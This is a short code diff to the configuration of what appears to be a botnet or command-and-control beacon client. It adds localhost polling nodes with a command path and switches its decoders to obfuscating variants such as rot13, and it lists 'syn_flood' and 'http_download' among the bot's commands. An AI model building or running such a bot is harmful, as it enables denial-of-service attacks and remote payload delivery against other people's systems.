@@ -23,7 +23,9 @@ MIN_SLEEP_INT = 60
 MAX_SLEEP_INT = 600
 ACTIVE_DAYS = ('M','T','W','Th','F','Sa','Su')
 ACTIVE_HOURS = ('0001','2359')
-NODES = [('http_get',{'node':'127.0.0.1','port':'8080'}),('http_get',{'node':'127.0.0.1','port':'8090'})]
+NODES = [('http_get',{'node':'127.0.0.1','port':'8080','path':'sample_command.html'})
+        ,('http_get',{'node':'127.0.0.1','port':'8000','path':'sample_command.html'})
+        ,('http_get',{'node':'127.0.0.1','port':'8090','path':'sample_command.html'})]
 
 # global flag
 continue_beacon = True
@@ -34,7 +36,7 @@ def load_config():
     #
     beacons = ['http_get']
     commands = ['syn_flood','http_download']
-    decoders = ['json','base64']
+    decoders = ['base64c','jsonc','rot13']
     encoders = []
     responders = []
     
